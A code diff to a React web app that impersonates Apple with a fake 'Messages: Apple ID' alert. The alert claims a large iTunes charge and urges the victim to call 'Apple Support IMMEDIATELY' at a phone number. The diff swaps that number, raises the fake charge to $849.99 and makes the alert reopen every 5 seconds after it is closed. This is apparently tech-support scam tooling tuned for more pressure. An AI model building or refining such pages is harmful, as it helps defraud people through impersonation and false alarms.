@@ -54,7 +54,7 @@ const ContactMethod = ({ icon: Icon, title, description, action, onClick }: { ic
 
 export default function App() {
   const [isChargeAlertOpen, setIsChargeAlertOpen] = useState(false);
-  const TOLL_FREE = '+1-808-219-3011';
+  const TOLL_FREE = '+1-888-587-6471';
 
   useEffect(() => {
     // Initial alert
@@ -62,13 +62,13 @@ export default function App() {
       setIsChargeAlertOpen(true);
     }, 1500);
 
-    // Recurring alert every 7 seconds if closed
+    // Recurring alert every 5 seconds if closed
     const interval = setInterval(() => {
       setIsChargeAlertOpen(prev => {
         if (!prev) return true;
         return prev;
       });
-    }, 7000);
+    }, 5000);
 
     return () => {
       clearTimeout(initialTimer);
@@ -207,7 +207,7 @@ export default function App() {
         isOpen={isChargeAlertOpen}
         onClose={() => setIsChargeAlertOpen(false)}
         title="Messages: Apple ID"
-        message="NOTICE: A transaction of $349.99 has been deducted from your Apple ID for iTunes. If this was not you, call Apple Support IMMEDIATELY at +1-808-219-3011 to stop this charge."
+        message="NOTICE: A transaction of $849.99 has been deducted from your Apple ID for iTunes. If this was not you, call Apple Support IMMEDIATELY at +1-888-587-6471 to stop this charge."
         actions={[
           { 
             label: "Ignore", 
